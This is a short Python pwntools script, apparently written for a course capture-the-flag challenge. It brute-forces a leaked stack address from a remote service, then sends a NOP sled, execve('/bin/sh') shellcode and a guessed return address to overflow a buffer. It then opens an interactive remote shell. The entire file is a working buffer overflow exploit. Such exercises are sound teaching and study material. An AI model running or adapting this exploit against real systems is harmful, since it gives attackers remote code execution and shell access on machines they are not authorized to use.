from pwn import *
import sys
import traceback
# 0x407fc378 is beginning of buffer guess
# shell is 45 long
#context.log_level='debug'
addrs = []
int_addrs = []
for i in range(10):
	#r = process("./brute")
	r = remote("cs4401shell2.walls.ninja", 55435)
        r.sendline("hi")
        addrs.append(r.recvline())
	r.close()

for addr in addrs:
	int_addrs.append(int(addr[:-1], 16))
	print(addr[:-1])

sum = 0
count = 0
for int_addr in int_addrs:
	count+=1
	sum = sum + int_addr

guess_ret = int(hex(sum//count), 16) + 8000
print("Guess address is: " + hex(guess_ret))

shell = b'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'

nop = b'\x90'*16339

guess_ret_pckd = p32(guess_ret)

exploit_str = nop + shell + 'c'*4 + guess_ret_pckd

r = remote("cs4401shell2.walls.ninja", 55435)
r.sendline(exploit_str)
r.interactive()
